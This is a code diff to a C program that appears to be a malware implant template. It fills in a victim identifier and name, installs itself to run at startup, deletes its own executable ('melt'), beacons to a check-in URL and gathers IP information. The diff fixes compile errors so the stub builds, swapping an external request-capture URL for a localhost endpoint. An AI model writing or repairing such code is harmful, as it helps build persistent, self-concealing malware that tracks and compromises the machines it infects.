@@ -122,29 +122,34 @@ int main(int argc, char *argv[])
 {
     char *uuid = "{{uuid}}";
     char *name = "{{name}}";
-    //char url[] = "https://reqinspect.alpine.cx/capture/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1"; // https://reqinspect.alpine.cx/session/9bc05d15-bc2a-41dc-84d2-9db7cf4053f1
-    char check-in-url[] = "http://127.0.0.1/api/check-in/"
-    char *full_url = malloc(strlen(url) + strlen(uuid) + strlen(name) + 20);
-    sprintf(full_url, "%s?uuid=%s&name=%s", , uuid, name);
+    char check_in_url[] = "http://127.0.0.1/api/check-in/";
+    char *full_url = malloc(strlen(check_in_url) + strlen(uuid) + strlen(name) + 20);
+    if (!full_url)
+    {
+        perror("Error allocating memory");
+        return 1;
+    }
+    sprintf(full_url, "%s?uuid=%s&name=%s", check_in_url, uuid, name);
 
 #ifdef STARTUP_SELECT
-    if (argc == 0)
+    if (argc < 1)
     {
         fprintf(stderr, "Error: argv[0] is not available.\n");
+        free(full_url);
         return 1;
     }
     add_to_startup(argv[0]);
 #endif
 
 #ifdef MELT_SELECT
-    if (argc == 0)
+    if (argc < 1)
     {
         fprintf(stderr, "Error: argv[0] is not available.\n");
+        free(full_url);
         return 1;
     }
     melt_file(argv[0]);
 #endif
-
 
     send_get_request(full_url);
     char *buffer = get_ip_info();
